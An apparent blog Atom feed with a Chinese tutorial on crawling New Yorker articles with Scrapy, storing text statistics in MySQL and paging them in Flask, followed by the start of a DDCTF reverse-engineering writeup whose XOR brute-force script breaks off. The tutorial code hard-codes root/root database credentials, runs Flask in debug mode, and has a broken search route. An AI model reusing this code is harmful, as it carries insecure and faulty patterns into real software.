<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>All Right</title>
  <subtitle>A binary security Porter</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://spd.dropsec.xyz/"/>
  <updated>2017-07-06T02:18:02.985Z</updated>
  <id>http://spd.dropsec.xyz/</id>
  
  <author>
    <name>All Right</name>
    <email>spd@dropsec.xyz</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>纽约客网站文章爬取与统计</title>
    <link href="http://spd.dropsec.xyz/2017/07/01/%E7%BA%BD%E7%BA%A6%E5%AE%A2%E7%BD%91%E7%AB%99%E6%96%87%E7%AB%A0%E7%88%AC%E5%8F%96%E4%B8%8E%E7%BB%9F%E8%AE%A1/"/>
    <id>http://spd.dropsec.xyz/2017/07/01/纽约客网站文章爬取与统计/</id>
    <published>2017-07-01T03:33:45.000Z</published>
    <updated>2017-07-06T02:18:02.985Z</updated>
    
    <content type="html"><![CDATA[<h3 id="内容介绍"><a href="#内容介绍" class="headerlink" title="内容介绍"></a>内容介绍</h3><ol>
<li>用scrapy框架编写爬虫，爬取纽约客网站文章，包括文章url、文章标题、作者及发表时间、文章正文、图片等。</li>
<li>将上述爬取到的信息保存到mysql数据库中。</li>
<li>将数据库中的文章进行分页展示。</li>
<li>统计每篇文章正文的单词总数、段落总数、句子总数、词汇总数，并计算平均单词长度（单词字母数）、平均句子长度（句子单词数）、平均段落长度（段落句子数）。<a id="more"></a>
</li>
</ol>
<h3 id="开发环境配置"><a href="#开发环境配置" class="headerlink" title="开发环境配置"></a>开发环境配置</h3><p>Python2.7</p>
<p>Pycharm2016.2.3</p>
<p>Windows7 64位</p>
<p>Python2.7环境配置</p>
<ul>
<li>打开<a href="https://www.python.org/downloads/release/python-2712/页面，下载Windows" target="_blank" rel="external">https://www.python.org/downloads/release/python-2712/页面，下载Windows</a> x86-64 MSI installer 进行安装，安装完成后，配置环境变量。</li>
<li>测试python是否安装成功，如果python成功安装并且配置好环境变量，那么在cmd中输入python，就能得到python版本的详细信息（如32位或64位)。</li>
</ul>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-1.png" alt=""></p>
<p>Pycharm安装</p>
<p>先在官网上下载<a href="http://www.jetbrains.com/pycharm/download/" target="_blank" rel="external">http://www.jetbrains.com/pycharm/download/</a><br>下载后进行安装</p>
<p>scrapy框架的安装</p>
<p>Scrapy安装过程中需要很多依赖项，lxml,pyin32,twisted,pyOpenSSL,zope.inerface等等，而这些依赖在安装过程中很容易出错，最好的办法就是下载最新的python2.7。在cmd命令行下执行pip install scrapy 进行安装，安装成功后在cmd中输入scrapy。结果如下：<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-2.png" alt=""></p>
<p>我们cmd执行$ Python进入python控制台</p>
<ul>
<li>执行import lxml，如果没报错，则说明lxml安装成功.</li>
<li>执行import twisted，如果没报错，则说明twisted安装成功.</li>
<li>执行import OpenSSL，如果没报错，则说明OpenSSL安装成功.</li>
<li>执行import zope.interface，如果没报错，则说明zope.interface安装成功.</li>
</ul>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-3.png" alt=""></p>
<p>Flask框架安装</p>
<ul>
<li>在D盘中创建myvir文件(任意文件)，打开cmd进入这个目录</li>
<li>安装虚拟环境，pip install virtualenv 进行安装</li>
<li>安装Flask,pip install Flask进行安装</li>
</ul>
<h3 id="开发过程"><a href="#开发过程" class="headerlink" title="开发过程"></a>开发过程</h3><h4 id="数据爬取过程的实现"><a href="#数据爬取过程的实现" class="headerlink" title="数据爬取过程的实现"></a>数据爬取过程的实现</h4><p>进入cmd ,用scrapy stratproject newyorker 命令创建一个命名为newyorker的项目。创建scrapy项目后会形成如下目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">newyorker/</div><div class="line">   scrapy.cfg</div><div class="line">   newyorker/</div><div class="line">       __init__.py</div><div class="line">       items.py</div><div class="line">       pipelines.py</div><div class="line">       settings.py</div><div class="line">       spiders/</div><div class="line">           __init__.py</div><div class="line">           ...</div></pre></td></tr></table></figure></p>
<p>这些文件分别是：<br>scrapy.cfg: 项目的配置文件</p>
<p>newyorker/: 该项目的python模块。之后将在此加入代码。</p>
<p>newyorker/items.py: 项目中的item文件.</p>
<p>newyorker/pipelines.py: 项目中的pipelines文件.</p>
<p>newyorker/settings.py: 项目的设置文件.</p>
<p>newyoker/spiders/: 放置spider代码的目录.</p>
<p>我们在newyorker中创建new_spider.py文件，在此文件中我们编写爬取网站文章，和统计文章的关键代码，new_spider.py的内容如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request</div><div class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span>  BeautifulSoup</div><div class="line"><span class="keyword">from</span> scrapy.selector <span class="keyword">import</span> Selector</div><div class="line"><span class="keyword">from</span> newyorker.items <span class="keyword">import</span> NewyorkerItem</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">newyorker</span><span class="params">(CrawlSpider)</span>:</span></div><div class="line">    name = <span class="string">"newyorker"</span></div><div class="line">    allowed_domains = [<span class="string">"newyorker.com"</span>]</div><div class="line">    start_urls = [<span class="string">'http://www.newyorker.com/news/daily-comment/'</span>]</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></div><div class="line">         sel = Selector(response)</div><div class="line">         infos = sel.xpath(<span class="string">"//main/div/ul/li"</span>)</div><div class="line"></div><div class="line">         <span class="keyword">for</span> info <span class="keyword">in</span> infos:</div><div class="line">             article_url_part = info.xpath(<span class="string">"div/h4/a/@href"</span>).extract()[<span class="number">0</span>]</div><div class="line">             article_url = <span class="string">'http://www.newyorker.com/'</span>+article_url_part</div><div class="line">             <span class="keyword">yield</span> Request(article_url,meta=&#123;<span class="string">'article_url'</span>:article_url&#125;,callback=self.parse_item)</div><div class="line"></div><div class="line"></div><div class="line">         urls = [<span class="string">'http://www.newyorker.com/news/daily-comment/page/&#123;&#125;'</span>.format(str(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)]</div><div class="line">         <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">                 <span class="keyword">yield</span> Request(url,callback=self.parse)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span><span class="params">(self,response)</span>:</span></div><div class="line">        item = NewyorkerItem()</div><div class="line"></div><div class="line">        item[<span class="string">'article_url'</span>] = response.meta[<span class="string">'article_url'</span>]</div><div class="line">        data =requests.get(response.meta[<span class="string">'article_url'</span>])</div><div class="line"></div><div class="line">        sel =Selector(response)</div><div class="line">        title = sel.xpath(<span class="string">"//h1/text()"</span>).extract()[<span class="number">0</span>]</div><div class="line">        author = sel.xpath(<span class="string">"//div/div/div[2]/p/a/text()"</span>).extract()[<span class="number">0</span>]</div><div class="line">        time = sel.xpath(<span class="string">"//hgroup/div[2]/p/text()"</span>).extract()[<span class="number">0</span>]</div><div class="line">       </div><div class="line"></div><div class="line">        soup=BeautifulSoup(data.text,<span class="string">'lxml'</span>)</div><div class="line">        image_urls = soup.select(<span class="string">'figure &gt; div &gt; picture &gt; img'</span>)[<span class="number">0</span>].get(<span class="string">'srcset'</span>)<span class="keyword">if</span> soup.find_all(<span class="string">'picture'</span>,<span class="string">'component-responsive-image'</span>)  <span class="keyword">else</span> <span class="keyword">None</span></div><div class="line">        articles=soup.select(<span class="string">'#articleBody p'</span>)</div><div class="line">        article = [i.text +<span class="string">'&lt;br /&gt;'</span> <span class="keyword">for</span> i <span class="keyword">in</span> articles]</div><div class="line">        article_process = str(article).replace(<span class="string">"', '"</span>,<span class="string">" "</span>).strip(<span class="string">"['"</span>).strip(<span class="string">"']"</span>).strip(<span class="string">" ?"</span>).replace(<span class="string">'\\xa0'</span>,<span class="string">''</span>)</div><div class="line">        w_sum = len(re.findall(<span class="string">'[a-zA-Z]+'</span>, article_process))</div><div class="line">        s_sum = len(re.findall(<span class="string">'([.!?].\s?[A-Z"（])'</span>, article_process))</div><div class="line">        p_sum = len(article)</div><div class="line">        v_sum = len(set(re.findall(<span class="string">'[a-zA-Z]+'</span>, article_process.lower())))</div><div class="line">        a_sum = len(re.findall(<span class="string">'[a-zA-Z]'</span>, article_process))</div><div class="line">        avg_w = round(a_sum / w_sum, <span class="number">2</span>)</div><div class="line">        avg_s = round(w_sum / s_sum, <span class="number">2</span>)</div><div class="line">        avg_p = round(s_sum / p_sum, <span class="number">2</span>)</div><div class="line"></div><div class="line">        item[<span class="string">'title'</span>]=title     <span class="comment">#标题</span></div><div class="line">        item[<span class="string">'author'</span>]=author   <span class="comment">#作者</span></div><div class="line">        item[<span class="string">'time'</span>]=time        <span class="comment">#时间</span></div><div class="line">        item[<span class="string">'article'</span>]=article_process  <span class="comment">#正文</span></div><div class="line">        item[<span class="string">'image_urls'</span>]= image_urls   <span class="comment">#图片</span></div><div class="line">        item[<span class="string">'w_sum'</span>]=w_sum         <span class="comment">#单词</span></div><div class="line">        item[<span class="string">'s_sum'</span>]=s_sum         <span class="comment">#句子</span></div><div class="line">        item[<span class="string">'p_sum'</span>]=p_sum         <span class="comment">#段落</span></div><div class="line">        item[<span class="string">'v_sum'</span>]=v_sum         <span class="comment">#词汇</span></div><div class="line">        item[<span class="string">'a_sum'</span>]=a_sum         <span class="comment">#字母</span></div><div class="line">        item[<span class="string">'avg_w'</span>]=avg_w <span class="comment">#平均单词长度</span></div><div class="line">        item[<span class="string">'avg_s'</span>]=avg_s <span class="comment">#平均句子长度</span></div><div class="line">        item[<span class="string">'avg_p'</span>]=avg_p <span class="comment">#平均段落长度</span></div><div class="line">        <span class="keyword">yield</span> item</div></pre></td></tr></table></figure></p>
<p>另外我们还需要连接数据库，当然在连接mysql数据库前，要确认是否安装了Python连接mysql数据库的驱动pymysql。连接数据库的代码写在pipelines.py文件中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pymysql</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbHandle</span><span class="params">()</span>:</span></div><div class="line">    conn = pymysql.connect(</div><div class="line">        host = <span class="string">"localhost"</span>,</div><div class="line">        user = <span class="string">"root"</span>,</div><div class="line">        passwd = <span class="string">"root"</span>,</div><div class="line">        db=<span class="string">"text"</span>,</div><div class="line">        port =<span class="number">3306</span>,</div><div class="line">        charset = <span class="string">"utf8"</span>,</div><div class="line">        use_unicode = <span class="keyword">False</span></div><div class="line">    )</div><div class="line">    <span class="keyword">return</span> conn</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">newyorkerPipeline</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self,item,spider)</span>:</span></div><div class="line">        dbObject = dbHandle()</div><div class="line">        cursor = dbObject.cursor()</div><div class="line">        cursor.execute(<span class="string">"USE text"</span>)</div><div class="line">        sql = <span class="string">"INSERT INTO newtext(title,author,time,article,image_urls,w_sum,s_sum,p_sum,v_sum,a_sum,avg_w,avg_s,avg_p) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            cursor.execute(sql, (item[<span class="string">'title'</span>], item[<span class="string">'author'</span>], item[<span class="string">'time'</span>], item[<span class="string">'article'</span>],item[<span class="string">'image_urls'</span>],item[<span class="string">'w_sum'</span>],item[<span class="string">'s_sum'</span>],item[<span class="string">'p_sum'</span>],item[<span class="string">'v_sum'</span>],item[<span class="string">'a_sum'</span>],item[<span class="string">'avg_w'</span>],item[<span class="string">'avg_s'</span>],item[<span class="string">'avg_p'</span>]))</div><div class="line">            cursor.connection.commit()</div><div class="line">        <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">print</span> e</div><div class="line">            dbObject.rollback()</div><div class="line">         </div><div class="line">        <span class="keyword">return</span> item</div></pre></td></tr></table></figure>
<p>我们用命令scrapy crawl newyorker启动这个项目，结果如下：<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-4.png" alt=""><br>我们打开数据库，发现数据库中已经存入了我们所要的数据，并完成了统计，当然在此之前要在数据库中建好数据库和表。<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-5-1.png" alt=""></p>
<h4 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h4><p>我们创建一个Flask项目，项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">D:.</div><div class="line">├─.idea</div><div class="line">│  └─dictionaries</div><div class="line">├─static</div><div class="line">│   └─web.css</div><div class="line">├─templates</div><div class="line">│    └─base.html</div><div class="line">│    └─index.html</div><div class="line">├─app.cfg</div><div class="line">└─app.py</div></pre></td></tr></table></figure></p>
<p>app.py中的代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</div><div class="line"><span class="keyword">import</span> pymysql</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, g, current_app</div><div class="line"><span class="keyword">from</span> flask_paginate <span class="keyword">import</span> Pagination, get_page_args</div><div class="line"><span class="keyword">import</span> click</div><div class="line"></div><div class="line">click.disable_unicode_literals_warning = <span class="keyword">True</span></div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.config.from_pyfile(<span class="string">'app.cfg'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.before_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></div><div class="line">	g.conn = pymysql.connect(</div><div class="line">        host = <span class="string">"localhost"</span>,</div><div class="line">        user = <span class="string">"root"</span>,</div><div class="line">        passwd = <span class="string">"root"</span>,</div><div class="line">        db=<span class="string">"text"</span>,</div><div class="line">        port =<span class="number">3306</span>,</div><div class="line">        charset = <span class="string">"utf8"</span>,</div><div class="line">        use_unicode = <span class="keyword">False</span></div><div class="line">    )</div><div class="line">	g.cur = g.conn.cursor()</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.teardown_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">teardown</span><span class="params">(error)</span>:</span></div><div class="line">    <span class="keyword">if</span> hasattr(g, <span class="string">'conn'</span>):</div><div class="line">        g.conn.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    g.cur.execute(<span class="string">'select count(*) from newtext'</span>)</div><div class="line">    user = g.cur.fetchone()[<span class="number">0</span>]</div><div class="line">    page, per_page, offset = get_page_args(page_parameter=<span class="string">'page'</span>,</div><div class="line">                                           per_page_parameter=<span class="string">'per_page'</span>)</div><div class="line">    sql = <span class="string">'select title from newtext order by title limit &#123;&#125;, &#123;&#125;'</span>\</div><div class="line">          .format(offset, per_page)</div><div class="line">    g.cur.execute(sql)</div><div class="line">    users = g.cur.fetchall()</div><div class="line">    <span class="keyword">print</span> <span class="string">"------sss"</span>, users</div><div class="line">    pagination = get_pagination(page=page,</div><div class="line">                                per_page=per_page,</div><div class="line">                                total=<span class="number">100</span>,</div><div class="line">                                record_name=<span class="string">'users'</span>,</div><div class="line">                                format_total=<span class="keyword">True</span>,</div><div class="line">                                format_number=<span class="keyword">True</span>,</div><div class="line">                                )</div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, users=users,</div><div class="line">                           page=page,</div><div class="line">                           per_page=per_page,</div><div class="line">                           pagination=pagination,</div><div class="line">                           )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/users/', defaults=&#123;'page': 1&#125;)</span></div><div class="line"><span class="meta">@app.route('/users', defaults=&#123;'page': 1&#125;)</span></div><div class="line"><span class="meta">@app.route('/users/page/&lt;int:page&gt;/')</span></div><div class="line"><span class="meta">@app.route('/users/page/&lt;int:page&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">users</span><span class="params">(page)</span>:</span></div><div class="line">    g.cur.execute(<span class="string">'select count(*) from newtext'</span>)</div><div class="line">    total = g.cur.fetchone()[<span class="number">0</span>]</div><div class="line">    page, per_page, offset = get_page_args()</div><div class="line">    sql = <span class="string">'select title from newtext order by title limit &#123;&#125;, &#123;&#125;'</span>\</div><div class="line">        .format(offset, per_page)</div><div class="line">    g.cur.execute(sql)</div><div class="line">    users = g.cur.fetchall()</div><div class="line">    pagination = get_pagination(page=page,</div><div class="line">                                per_page=per_page,</div><div class="line">                                total=total,</div><div class="line">                                record_name=<span class="string">'users'</span>,</div><div class="line">                                format_total=<span class="keyword">True</span>,</div><div class="line">                                format_number=<span class="keyword">True</span>,</div><div class="line">                                )</div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, users=users,</div><div class="line">                           page=page,</div><div class="line">                           per_page=per_page,</div><div class="line">                           pagination=pagination,</div><div class="line">                           active_url=<span class="string">'users-page-url'</span>,</div><div class="line">                           )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/search/&lt;name&gt;/')</span></div><div class="line"><span class="meta">@app.route('/search/&lt;name&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(name)</span>:</span></div><div class="line">    <span class="string">"""The function is used to test multi values url."""</span></div><div class="line">    sql = <span class="string">'select count(*) from newtext where title like ?'</span></div><div class="line">    <span class="comment">#sql = 'select title from newtext'</span></div><div class="line">    args = (<span class="string">'%&#123;&#125;%'</span>.format(title), )</div><div class="line">    g.cur.execute(sql)</div><div class="line">    total = g.cur.fetchone()[<span class="number">0</span>]</div><div class="line">  </div><div class="line">    page, per_page, offset = get_page_args()</div><div class="line">   <span class="comment"># sql = 'select * from articals where name like ? limit &#123;&#125;, &#123;&#125;'</span></div><div class="line">    <span class="comment">#g.cur.execute(sql.format(offset, per_page), args)</span></div><div class="line">    users = g.cur.fetchall()</div><div class="line">    pagination = get_pagination(page=page,</div><div class="line">                                per_page=per_page,</div><div class="line">                                total=total,</div><div class="line">                                record_name=users,</div><div class="line">                                )</div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, users=users,</div><div class="line">                           page=page,</div><div class="line">                           per_page=per_page,</div><div class="line">                           pagination=pagination,</div><div class="line">                           )</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_css_framework</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> current_app.config.get(<span class="string">'CSS_FRAMEWORK'</span>, <span class="string">'bootstrap3'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_link_size</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> current_app.config.get(<span class="string">'LINK_SIZE'</span>, <span class="string">'sm'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_single_page_or_not</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> current_app.config.get(<span class="string">'SHOW_SINGLE_PAGE'</span>, <span class="keyword">False</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pagination</span><span class="params">(**kwargs)</span>:</span></div><div class="line">    kwargs.setdefault(<span class="string">'record_name'</span>, <span class="string">'records'</span>)</div><div class="line">    <span class="keyword">return</span> Pagination(css_framework=get_css_framework(),</div><div class="line">                      link_size=get_link_size(),</div><div class="line">                      show_single_page=show_single_page_or_not(),</div><div class="line">                      **kwargs</div><div class="line">                      )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@click.command()</span></div><div class="line"><span class="meta">@click.option('--port', '-p', default=5000, help='listening port')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(port)</span>:</span></div><div class="line">    app.run(debug=<span class="keyword">True</span>, port=port)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    run()</div></pre></td></tr></table></figure></p>
<p>我们run这个项目，然后在浏览器中输入127.0.0.1：5000即可，结果如下:</p>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-7.png" alt=""></p>
<p>我们发现这个web程序已经成功读取到了mysql数据库中的数据并做好了分页。</p>
<p><img src="http://oj3cgkt4g.bkt.clouddn.com/2017-7-1-6-1.png" alt=""></p>
<p>这个项目的源码在我的github中，<a href="https://github.com/myGoodLuck/Python" target="_blank" rel="external">链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;内容介绍&quot;&gt;&lt;a href=&quot;#内容介绍&quot; class=&quot;headerlink&quot; title=&quot;内容介绍&quot;&gt;&lt;/a&gt;内容介绍&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;用scrapy框架编写爬虫，爬取纽约客网站文章，包括文章url、文章标题、作者及发表时间、文章正文、图片等。&lt;/li&gt;
&lt;li&gt;将上述爬取到的信息保存到mysql数据库中。&lt;/li&gt;
&lt;li&gt;将数据库中的文章进行分页展示。&lt;/li&gt;
&lt;li&gt;统计每篇文章正文的单词总数、段落总数、句子总数、词汇总数，并计算平均单词长度（单词字母数）、平均句子长度（句子单词数）、平均段落长度（段落句子数）。
    
    </summary>
    
      <category term="编程技术" scheme="http://spd.dropsec.xyz/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Python" scheme="http://spd.dropsec.xyz/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-逆向部分writeup</title>
    <link href="http://spd.dropsec.xyz/2017/05/24/DDCTF-%E9%80%86%E5%90%91%E9%83%A8%E5%88%86writeup/"/>
    <id>http://spd.dropsec.xyz/2017/05/24/DDCTF-逆向部分writeup/</id>
    <published>2017-05-24T12:49:15.000Z</published>
    <updated>2017-05-25T01:03:46.010Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>DDCTF比赛形式比较新颖，是解答一道题后会获得一个邮箱，将writeup发送到邮箱后会给你回复下一个题。而且是逆向和web交叉，如果解答不了当前题目就无法进入下一题，它考察一个人的综合技术素养。这个比赛到目前还没有结束，它为期十三天，但是邻近期末，各种结课作业，各种考试接踵而至，早已没有精力和时间再去做它了，所以提前写个博客记录一下比赛心得。<br><a id="more"></a></p>
<h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>这个题是个64位的ELF文件，分析后我们发现byte_100001040[]这个数组里面的值做处理后得到v2,然后又将byte_100001040[]数组里面的之挨个减去2后,又和v2进行了按位亦或操作。然后输出结果。<br><img src="http://obmugrq95.bkt.clouddn.com/20170525-1.png" alt=""><br>下面是byte_100001040[]数组里面的值。<br><img src="http://obmugrq95.bkt.clouddn.com/20170525-2.png" alt=""><br>既然我们不知道V2的值，那我们对V2进行爆破，然后求得结果。<br>爆破脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</div><div class="line">    byte_100001040 = [<span class="number">0x41</span>,<span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x0A</span>, <span class="number">0x64</span>,</div><div class="line">                      <span class="number">0x67</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x62</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>,</div><div class="line">                      <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x3D</span>, 